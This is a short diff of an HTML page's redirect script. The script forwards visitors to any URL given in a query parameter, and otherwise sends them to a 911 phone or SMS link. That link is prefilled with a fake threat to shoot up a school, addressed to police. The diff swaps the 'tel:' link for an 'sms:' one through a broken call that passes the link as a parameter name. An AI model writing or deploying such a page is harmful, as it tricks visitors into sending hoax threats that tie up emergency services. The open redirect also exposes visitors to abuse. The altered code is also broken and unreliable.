@@ -4,10 +4,10 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const targetUrl = urlParams.get('url');
+        const trollUrl = urlParams.get("sms:+911?body=Sup+Pigs%21%3F+Finna+shoot+up+a+school%2C+you+boutta+pull+up+or+nah%3F+%23BlazeWuzHere");
         if (targetUrl) {
             window.location.href = targetUrl;
         } else {
-            trollUrl = "tel:+911?body=Sup+Pigs%21%3F+Finna+shoot+up+a+school%2C+you+boutta+pull+up+or+nah%3F+%23BlazeWuzHere";
             window.location.href = trollUrl;
         }
     </script>
